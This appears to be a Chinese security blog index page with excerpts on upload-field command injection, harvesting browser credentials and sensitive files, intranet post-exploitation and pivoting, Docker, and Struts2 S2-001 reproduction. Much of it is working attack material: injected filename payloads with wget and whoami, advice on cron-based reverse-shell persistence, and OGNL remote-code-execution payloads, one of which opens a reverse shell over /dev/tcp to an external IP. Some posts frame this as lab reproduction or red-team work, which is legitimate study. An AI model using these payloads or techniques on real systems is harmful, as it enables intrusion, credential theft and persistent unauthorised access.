测试上传:<span class="sb">`</span><span class="nb">sleep </span>10<span class="sb">`</span>filename

测试filenname:<span class="sb">`</span><span class="o">||</span>wget%20服务器地址<span class="sb">`</span>

测试上传处下的名称: <span class="p">;</span>payload|payload&amp;payload
<span class="p">;</span><span class="nb">whoami</span>|whoami&amp;whoami
<span class="nt">------</span>
</code></pre></div></div>

<h1 id="个人机器信息收集">个人机器信息收集</h1>

<ol>
  <li>
    <p>浏览器[Chrome,Firefox,Edge,IE,360,QQ ]信息(历史记录，密码，书签，cookie)：</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%LocalAppData%\Google\Chrome\User Data\Default
%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\
</code></pre></div>    </div>
  </li>
  <li>
    <p>机器内敏感文件，关键词：账号、密码、备份、登录、管理、邮箱、后台、资产、网络</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for /r D:\ %i in (*密码*) do @echo %i
for /r D:\ %i in (*vpn*) do @echo %i
for /r D:\ %i in (*账号*) do @echo %i
</code></pre></div>    </div>
  </li>
  <li>
    <p>机器进程</p>

    <ul>
      <li>杀软/edr</li>
      <li>teamviewer/等远程管理工具</li>
      <li>服务类进程：mssql/java/web服务</li>
    </ul>
  </li>
  <li>
    <p>安装软件列表</p>
  </li>
  <li>
    <p>当前windows 凭证管理器存储的密码</p>

    <ul>
      <li>
        <p>登录密码（mimikatz）</p>
      </li>
      <li>
        <p>wifi密码</p>
      </li>
      <li>
        <p>outlook密码</p>
      </li>
      <li>
        <p>……</p>
      </li>
    </ul>
  </li>
  <li>
    <p>机器开放端口信息/防火墙信息/获取机器共享</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat -naop
wmic share  get name,path,status  #利用wmic查找共享
</code></pre></div>    </div>
  </li>
  <li>
    <p>获取机器所有rdp连接记录</p>
  </li>
  <li>
    <p>获取所有盘符</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber,size #查看分区
</code></pre></div>    </div>
  </li>
  <li>
    <p>获取全盘所有敏感文件</p>

    <p>.doc\xlsx\md\sql\ppt*\txt</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for /r D:\ %i in (*.doc) do @echo %i
for /r D:\ %i in (*.xlsx) do @echo %i
for /r D:\ %i in (*.ppt*)) do @echo %i
</code></pre></div>    </div>
  </li>
  <li>
    <p>本地环境</p>
    <ul>
      <li>hosts</li>
      <li>环境变量</li>
      <li>补丁列表</li>
      <li>当前主机的会话信息</li>
    </ul>
  </li>
</ol>

<p>工作不饱和 总结了一下个人办公机信息收集思路</p>

          <p><a href="/blog/2020/learn/to/fuzz/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/walkthrough/insideNet/"><h3 class="ctitle">「信息搜集」:漫谈一些在内网的信息搜集技巧</h3></a>
          <p><csmall>Jun 8, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <p>经历过几次HW行动，每次HW都运气较好可以拿到服务器，于是每次公司的内网渗透的任务就交给我，记录一下对于内网的信息搜集过程，以及在此过程中我自己所积累的小技巧。</p>

<h2 id="passwd">passwd</h2>

<p>一般来说通过<code class="language-plaintext highlighter-rouge">shiro</code>和<code class="language-plaintext highlighter-rouge">struts2</code>拿到的shell基本都是root，很多人都会直接去读取passwd文件，其实并不可取。下面展示一下2核4G服务器跑hash文件的过程。一般是跑不出来的，hash过程较难逆，除非存在彩虹表，一般都跑不出来。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 1800 <span class="nt">-a</span> 0 <span class="nt">-o</span> found.txt linux-root.txt /usr/share/john/password.lst <span class="nt">--force</span>
hashcat <span class="o">(</span>v4.0.1<span class="o">)</span> starting...

OpenCL Platform <span class="c">#1: The pocl project</span>
<span class="o">====================================</span>
<span class="k">*</span> Device <span class="c">#1: pthread-Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz, 256/738 MB allocatable, 1MCU</span>

Hashes: 2 digests<span class="p">;</span> 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
<span class="k">*</span> Zero-Byte
<span class="k">*</span> Uses-64-Bit

Password length minimum: 0
Password length maximum: 256

ATTENTION! Pure <span class="o">(</span>unoptimized<span class="o">)</span> OpenCL kernels selected.
This enables cracking passwords and salts <span class="o">&gt;</span> length 32 but <span class="k">for </span>the price of drastical reduced performance.
If you want to switch to optimized OpenCL kernels, append <span class="nt">-O</span> to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.
Watchdog: Temperature retain trigger disabled.

<span class="k">*</span> Device <span class="c">#1: build_opts '-I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=16 -D KERN_TYPE=1800 -D _unroll'</span>
<span class="k">*</span> Device <span class="c">#1: Kernel m01800.8f866878.kernel not found in cache! Building may take a while...</span>

</code></pre></div></div>
<p>继续 :(</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>s]tatus <span class="o">[</span>p]ause <span class="o">[</span>r]esume <span class="o">[</span>b]ypass <span class="o">[</span>c]heckpoint <span class="o">[</span>q]uit <span class="o">=&gt;</span> Dictionary cache built:
<span class="k">*</span> Filename..: /usr/share/john/password.lst
<span class="k">*</span> Passwords.: 3559
<span class="k">*</span> Bytes.....: 26325
<span class="k">*</span> Keyspace..: 3559
<span class="k">*</span> Runtime...: 0 secs

- Device <span class="c">#1: autotuned kernel-accel to 128</span>
- Device <span class="c">#1: autotuned kernel-loops to 128</span>
<span class="o">[</span>s]tatus <span class="o">[</span>p]ause <span class="o">[</span>r]esume <span class="o">[</span>b]ypass <span class="o">[</span>c]heckpoint <span class="o">[</span>q]uit <span class="o">=&gt;</span> <span class="o">[</span>s]tatus <span class="o">[</span>p]ause <span class="o">[</span>r]esume <span class="o">[</span>b]ypass <span class="o">[</span>c]heckpoApproaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Exhausted
Hash.Type........: sha512crypt <span class="nv">$6$,</span> SHA512 <span class="o">(</span>Unix<span class="o">)</span>
Hash.Target......: linux-root.txt
Time.Started.....: Mon Jun  8 11:29:25 2020 <span class="o">(</span>23 secs<span class="o">)</span>
Time.Estimated...: Mon Jun  8 11:29:48 2020 <span class="o">(</span>0 secs<span class="o">)</span>
Guess.Base.......: File <span class="o">(</span>/usr/share/john/password.lst<span class="o">)</span>
Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
Speed.Dev.#1.....:      311 H/s <span class="o">(</span>8.82ms<span class="o">)</span>
Recovered........: 0/2 <span class="o">(</span>0.00%<span class="o">)</span> Digests, 0/2 <span class="o">(</span>0.00%<span class="o">)</span> Salts
Progress.........: 7118/7118 <span class="o">(</span>100.00%<span class="o">)</span>
Rejected.........: 0/7118 <span class="o">(</span>0.00%<span class="o">)</span>
Restore.Point....: 3559/3559 <span class="o">(</span>100.00%<span class="o">)</span>
Candidates.#1....: doom2 -&gt; sss
HWMon.Dev.#1.....: N/A

Started: Mon Jun  8 11:28:50 2020
Stopped: Mon Jun  8 11:29:49 2020
</code></pre></div></div>
<p>一般建议可以以root用户新建用户来维持权限，或者是写入<code class="language-plaintext highlighter-rouge">corntab</code>计划来定时反弹shell。实操中几乎很少有运维、开发去检查定时计划的反弹shell脚本，所以基本上可以满足后持续渗透的条件。</p>

<h2 id="信息搜集阶段">信息搜集阶段</h2>

<ul>
  <li>配置文件</li>
</ul>

<p>数据库配置信息 通过mybatis等配置文件就可以拿到内网中对应的数据库机器，一般都是低权限，运气好可以拿到高权限。运气再好一点存在高权限的mssql数据库可以尝试连接一下尝试<code class="language-plaintext highlighter-rouge">xp_cmd_shell</code>来执行命令。</p>

<blockquote>
  <p><strong>有的时候拿到的机器或多或少存在一些特殊情况，比如docker机器、单纯的一个数据库机器，那么就尽力而为去做一些搜集工作，特别是docker机器，除了跑的服务，机器里面太干净了，基本没有什么可以利用的地方。</strong></p>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>在当前目录下搜索存在字符为<span class="s1">'mysql'</span>的文件
<span class="nb">grep</span> <span class="nt">-rn</span> <span class="s2">"mysql"</span> <span class="nb">.</span>
<span class="o">=======</span>
查看对应系统的敏感配置文件
<span class="nb">cat </span>static/scripts/tinymce/js/tinymce/plugins/jbimages/ci/application/config/database.php
<span class="o">=======</span>
curl ifconfig.me
120.25.13.49
</code></pre></div>  </div>
</blockquote>

<p>我们通过web层面拿到的机器，一般都是web服务器，即存在各种jar包，所以服务器里会存放大量配置文件</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps <span class="nt">-ef</span>|grep java

netstat <span class="nt">-ANTUP</span>
</code></pre></div></div>
<p>通过进程任务可以查找到部署jar包的目录和相对应依赖，大部分运维和开发都习惯于在根目录下新建data目录或者是非系统文件夹下的目录存在web的依赖jar包，我们就可以从这点做突破口。查看一下端口开放情况和对应的目录位置，有一些shell的基础就可以搜集到这些信息。</p>

<ul>
  <li>bash_history</li>
</ul>

<p>命令执行历史文件一般建议必看，里面会存着一些意想不到的内容，下面截取一小部分我在内网实战中发现的惊喜：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su root
crontab <span class="nt">-e</span>
su rppt
su root
crontab <span class="nt">-e</span>
crontab <span class="nt">-l</span>
ll
<span class="nb">cd </span>domain/
ll
<span class="nb">cd </span>nexus3/
ll
<span class="nb">cd </span>nexus-3.12.0-01
ll
<span class="nb">cd </span>bin/
./nexus start
pactera@575
<span class="nb">cd </span>domain/
ll
<span class="nb">cd </span>nexus3/
</code></pre></div></div>
<p>注意<code class="language-plaintext highlighter-rouge">./nexus start</code>和<code class="language-plaintext highlighter-rouge">cd domain/</code>两条命令中间的那个“命令”，对，没错那个是sudoer用户的密码，su切换直接就拥有root权限。我们分析一下为什么出现这样的现象：个人认为是在运行nexus程序是需要密码来提升权限，然后输入者在等待过程中没有发现输入密码的shell还没有回显出来就输入了密码，从而导致密码被系统当作执行命令记录进了history文件。</p>

<hr />
<p><strong>发现这个后，我第一时间去看了自己服务器和自己的mac本上的历史文件，搜索机器密码关键词，同时也存在这样的现象明文密码存在了里面</strong></p>

<p><strong>醍醐灌顶</strong></p>

<p>总结下来，内网的信息收集需要的是细心。</p>

<h3 id="内网穿透">内网穿透</h3>
<p>在写之前我们需要明确一点，就是我们所需要的内网目标是什么？
而内网穿透和内网代理的分别在哪里？
在什么情况我们需要做内网穿透，什么时候我们需要做内网代理？</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 reGeorgSocksProxy.py <span class="nt">-p</span> 9999 <span class="nt">-l</span> 0.0.0.0 <span class="nt">-u</span> https://www.pgyer.com/tunnel.nosocket.php
</code></pre></div></div>
<p>内网穿透就是针对一个机器下的某一个特定端口，通过流量转发的形式把端口暴露在公网上，举个例子，我们拿下了一个linux机器，很巧这个机器是运维机器，我们发现了大量的运维账号密码。
又然后，发现windows的远程登录服务即3389端口，所以我们在这个时候可以使用端口服务转发的技巧，把端口流量转发到一个我们可控公网的端口上（如33890），那么我们在对我们自己可控公网的端口上进行数据请求的时候，就是在对这个windows机器的数据请求，所以我们可以很轻松的使用我们的到的账号和密码来连接对应的windows机器。</p>

<p>所以我们做内网穿透的最终目的，很显然是：
我们在已知某个内网服务器的敏感信息（如3389远程连接账号密码、3306连接账号密码），而我们在内网又无法使用windows机器远程连接、mysql-client软件对我们所得到的信息进行明确验证时，那么这个时候我们可以使用内网穿透即流量转发的手段来进行进一步验证。</p>

<h2 id="内网代理">内网代理</h2>
<p>内网代理，顾名思义就是我们自己可控的本机，通过各种代理方法（s5、s4），把拿下的内网服务器当作流量转发的一个中间跳板，对内网进行一系列我们想做的事情。这种情况下，我们的代理机器在内网没有具体的一个身份，只是我们通过代理的方式把我们对内网所发出的流量通过内网可控服务器向内网进行请求。</p>

<h3 id="frp代理">frp代理</h3>
<p>极力推荐。挂了代理就已经进入了内网，十分方便。只需要配置vps（frps）端，拿下shell后下载frpc客户端，启动服务就可以。
windows：proxifier
linux：frpc</p>

<h3 id="lcx代理">lcx代理</h3>
<p>没用过，听过。</p>


          <p><a href="/blog/2020/walkthrough/insideNet/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/use/Docker/Elegently/"><h3 class="ctitle">「Docker」:use docker elegant:)</h3></a>
          <p><csmall>May 27, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <p>网上有很多关于vulhub的docker构建教程，就不重复造轮子了。记录一些日常使用dokcer遇到的问题</p>

<h1 id="docker常用">docker常用</h1>
<h2 id="连接重置">连接重置</h2>
<blockquote>
  <p>Burp Suite Professional
Error Connection reset
当前无法使用此页面 当前无法处理此请求。HTTP ERROR 503</p>
</blockquote>

<p>之前做一个struts2/s2-057的漏洞复现，因为是自己的服务器就各种造，扫描器什么的一把梭。最后靶场被玩儿坏了。尝试能不能重装镜像解决:(
这里我随便拿了一个镜像举列子</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">docker</span> <span class="nx">images</span>
<span class="nx">REPOSITORY</span>          <span class="nx">TAG</span>                 <span class="nx">IMAGE</span> <span class="nx">ID</span>            <span class="nx">CREATED</span>             <span class="nx">SIZE</span>
<span class="nx">xdebug</span><span class="o">-</span><span class="nx">rce_php</span>      <span class="nx">latest</span>              <span class="mi">6026</span><span class="nx">f10530db</span>        <span class="mi">3</span> <span class="nx">days</span> <span class="nx">ago</span>          <span class="mi">393</span><span class="nx">MB</span>
<span class="nx">vulhub</span><span class="o">/</span><span class="nx">php</span>          <span class="mf">7.1</span><span class="p">.</span><span class="mi">12</span><span class="o">-</span><span class="nx">apache</span>       <span class="mi">10</span><span class="nx">fffe5b286c</span>        <span class="mi">2</span> <span class="nx">years</span> <span class="nx">ago</span>         <span class="mi">392</span><span class="nx">MB</span>
<span class="nx">vulhub</span><span class="o">/</span><span class="nx">tomcat</span>       <span class="mf">8.5</span>                 <span class="mi">66</span><span class="nx">ba03f6c1d8</span>        <span class="mi">3</span> <span class="nx">years</span> <span class="nx">ago</span>         <span class="mi">367</span><span class="nx">MB</span>
<span class="nx">vulhub</span><span class="o">/</span><span class="nx">tomcat</span>       <span class="mf">8.0</span>                 <span class="mi">458575</span><span class="nx">a05d97</span>        <span class="mi">3</span> <span class="nx">years</span> <span class="nx">ago</span>         <span class="mi">357</span><span class="nx">MB</span>
</code></pre></div></div>
<h4 id="删除本地镜像">删除本地镜像</h4>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">docker</span> <span class="nx">rmi</span> <span class="mi">6026</span><span class="nx">f10530db</span>
<span class="nx">Untagged</span><span class="p">:</span> <span class="nx">xdebug</span><span class="o">-</span><span class="nx">rce_php</span><span class="p">:</span><span class="nx">latest</span>
<span class="nx">Deleted</span><span class="p">:</span> <span class="nx">sha256</span><span class="p">:</span><span class="mi">6026</span><span class="nx">f10530db39c61d31e0461ccbff4786e8c604c34f8ff8167d7ac89c81446a</span>
<span class="nx">Deleted</span><span class="p">:</span> <span class="nx">sha256</span><span class="p">:</span><span class="mi">4</span><span class="nx">ce36271980f0f494e1a935bdaced37ea38d08fb167d54c50440fc009df315f9</span>
<span class="nx">Deleted</span><span class="p">:</span> <span class="nx">sha256</span><span class="p">:</span><span class="nx">d43d3fbbbb36edd2dbedd5df458789c7c57b5fd366403830bb6ac01b42b743d7</span>
<span class="nx">Deleted</span><span class="p">:</span> <span class="nx">sha256</span><span class="p">:</span><span class="nx">b15d563c13eccd51017c2bfa269f322744cb476c4c62749d5356cd0069d6391d</span>
</code></pre></div></div>
<p>如果报错提示无法删除，大概率情况下是指定删除的镜像docker内在运行，直接停止就行。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">docker</span> <span class="nx">rm</span> <span class="mi">6026</span><span class="nx">f10530db</span><span class="err">：</span><span class="nx">删除已停止的容器</span>
<span class="nx">docker</span> <span class="nx">rm</span> <span class="o">-</span><span class="nx">f</span> <span class="mi">6026</span><span class="nx">f10530db</span><span class="err">：</span><span class="nx">删除正在运行的容器</span>
</code></pre></div></div>

<h4 id="进入容器执行命令">进入容器执行命令</h4>
<p>重要的是<code class="language-plaintext highlighter-rouge">CONTAINER ID</code>值，执行<code class="language-plaintext highlighter-rouge">docker ps</code>查看就可以：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>docker <span class="nb">exec</span> <span class="nt">-it</span> 775c7c9ee1e1 /bin/bash
</code></pre></div></div>

<ul>
  <li>报错：</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>go <span class="nb">install</span>: no <span class="nb">install </span>location <span class="k">for </span>directory outside GOPATH:
</code></pre></div></div>
<p>参考：
https://stackoverflow.com/questions/26134975/go-install-no-install-location-for-directory-outside-gopath</p>

<p>进入容器后就可以直接执行命令，ifconfig：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>br-4c7c2091db92: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.24.0.1  netmask 255.255.0.0  broadcast 172.24.255.255
        inet6 fe80::42:b7ff:feb7:f51d  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 02:42:b7:b7:f5:1d  txqueuelen 0  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 46  bytes 4538 <span class="o">(</span>4.4 KiB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 65  bytes 4778 <span class="o">(</span>4.6 KiB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: <span class="nv">flags</span><span class="o">=</span>4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        inet6 fe80::42:94ff:feb9:c3dc  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 02:42:94:b9:c3:dc  txqueuelen 0  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 1602494  bytes 995390708 <span class="o">(</span>949.2 MiB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1434833  bytes 872808706 <span class="o">(</span>832.3 MiB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.17.185.134  netmask 255.255.240.0  broadcast 172.17.191.255
        inet6 fe80::216:3eff:fe03:a170  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 00:16:3e:03:a1:70  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 6405140  bytes 5419609300 <span class="o">(</span>5.0 GiB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4733596  bytes 1372915223 <span class="o">(</span>1.2 GiB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  <span class="o">(</span>Local Loopback<span class="o">)</span>
        RX packets 20372  bytes 1792815 <span class="o">(</span>1.7 MiB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20372  bytes 1792815 <span class="o">(</span>1.7 MiB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth382577a: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet6 fe80::b067:b9ff:fece:612b  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether b2:67:b9:ce:61:2b  txqueuelen 0  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 46  bytes 5182 <span class="o">(</span>5.0 KiB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 83  bytes 6263 <span class="o">(</span>6.1 KiB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre></div></div>
<p>iptable：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables <span class="nt">-L</span>
<span class="c"># Warning: iptables-legacy tables present, use iptables-legacy to see them</span>
Chain INPUT <span class="o">(</span>policy ACCEPT<span class="o">)</span>
target     prot opt <span class="nb">source               </span>destination

Chain FORWARD <span class="o">(</span>policy ACCEPT<span class="o">)</span>
target     prot opt <span class="nb">source               </span>destination
DOCKER-USER  all  <span class="nt">--</span>  anywhere             anywhere
DOCKER-ISOLATION-STAGE-1  all  <span class="nt">--</span>  anywhere             anywhere
ACCEPT     all  <span class="nt">--</span>  anywhere             anywhere             ctstate RELATED,ESTABLISHED
DOCKER     all  <span class="nt">--</span>  anywhere             anywhere
ACCEPT     all  <span class="nt">--</span>  anywhere             anywhere
ACCEPT     all  <span class="nt">--</span>  anywhere             anywhere
ACCEPT     all  <span class="nt">--</span>  anywhere             anywhere             ctstate RELATED,ESTABLISHED
DOCKER     all  <span class="nt">--</span>  anywhere             anywhere
ACCEPT     all  <span class="nt">--</span>  anywhere             anywhere
ACCEPT     all  <span class="nt">--</span>  anywhere             anywhere

Chain OUTPUT <span class="o">(</span>policy ACCEPT<span class="o">)</span>
target     prot opt <span class="nb">source               </span>destination

Chain DOCKER <span class="o">(</span>2 references<span class="o">)</span>
target     prot opt <span class="nb">source               </span>destination
ACCEPT     tcp  <span class="nt">--</span>  anywhere             172.24.0.2           tcp dpt:http-alt

Chain DOCKER-ISOLATION-STAGE-1 <span class="o">(</span>1 references<span class="o">)</span>
target     prot opt <span class="nb">source               </span>destination
DOCKER-ISOLATION-STAGE-2  all  <span class="nt">--</span>  anywhere             anywhere
DOCKER-ISOLATION-STAGE-2  all  <span class="nt">--</span>  anywhere             anywhere
RETURN     all  <span class="nt">--</span>  anywhere             anywhere

Chain DOCKER-USER <span class="o">(</span>1 references<span class="o">)</span>
target     prot opt <span class="nb">source               </span>destination
RETURN     all  <span class="nt">--</span>  anywhere             anywhere

Chain DOCKER-ISOLATION-STAGE-2 <span class="o">(</span>2 references<span class="o">)</span>
target     prot opt <span class="nb">source               </span>destination
DROP       all  <span class="nt">--</span>  anywhere             anywhere
DROP       all  <span class="nt">--</span>  anywhere             anywhere
RETURN     all  <span class="nt">--</span>  anywhere             anywhere
</code></pre></div></div>

          <p><a href="/blog/2020/use/Docker/Elegently/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/Apache/Strut2/Vuln/"><h3 class="ctitle">「Struts2」:Apache-Struts2框架漏洞复现</h3></a>
          <p><csmall>May 26, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h1 id="s2-001">s2-001</h1>
<p>struts2-001该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用<code class="language-plaintext highlighter-rouge">OGNL表达式%{value}</code>进行解析，然后重新填充到对应的表单数据中。
例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 <code class="language-plaintext highlighter-rouge">%{value}</code> 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。</p>

<blockquote>
  <p>影响版本：Struts 2.0.0 - Struts 2.0.8</p>
</blockquote>

<h3 id="payload代码">payload代码</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%25<span class="o">{</span><span class="c">#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</span>
</code></pre></div></div>
<p>发送回包回显如下：payload的注入命令<code class="language-plaintext highlighter-rouge">whoami</code>下方页面显示回显<code class="language-plaintext highlighter-rouge">root</code>，执行成功。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE html PUBLIC <span class="s2">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="s2">"http://www.w3.org/TR/html4/loose.dtd"</span><span class="o">&gt;</span>
&lt;html&gt;
&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"text/html; charset=UTF-8"</span><span class="o">&gt;</span>
&lt;title&gt;S2-001&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h2&gt;S2-001 Demo&lt;/h2&gt;
&lt;p&gt;link: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"https://struts.apache.org/docs/s2-001.html"</span><span class="o">&gt;</span>https://struts.apache.org/docs/s2-001.html&lt;/a&gt;&lt;/p&gt;

			
&lt;form <span class="nb">id</span><span class="o">=</span><span class="s2">"login"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"login"</span> <span class="nv">onsubmit</span><span class="o">=</span><span class="s2">"return true;"</span> <span class="nv">action</span><span class="o">=</span><span class="s2">"/login.action"</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"post"</span><span class="o">&gt;</span>
&lt;table <span class="nv">class</span><span class="o">=</span><span class="s2">"wwFormTable"</span><span class="o">&gt;</span>
	&lt;<span class="nb">tr</span><span class="o">&gt;</span>
    &lt;td <span class="nv">class</span><span class="o">=</span><span class="s2">"tdLabel"</span><span class="o">&gt;</span>&lt;label <span class="k">for</span><span class="o">=</span><span class="s2">"login_username"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"label"</span><span class="o">&gt;</span>username:&lt;/label&gt;&lt;/td&gt;
    &lt;td
<span class="o">&gt;</span>&lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"asdadas"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"login_username"</span>/&gt;
&lt;/td&gt;
&lt;/tr&gt;
root
</code></pre></div></div>
<p>payload1:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22whoami%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D
</code></pre></div></div>
<p>payload2(get shell):</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%25<span class="o">{</span><span class="c">#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"ping","dnslog.cn"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</span>

%25<span class="o">{</span><span class="c">#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash","-c","/bin/bash -i &gt;&amp; /dev/tcp/47.52.233.92/12341 0&gt;&amp; 1"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</span>

<span class="nt">--------------------</span>+
<span class="nt">--------------------</span>+
以下是使用payload，实测能够十分有效的进行各种poc代码注入，使用url编码效果更佳。
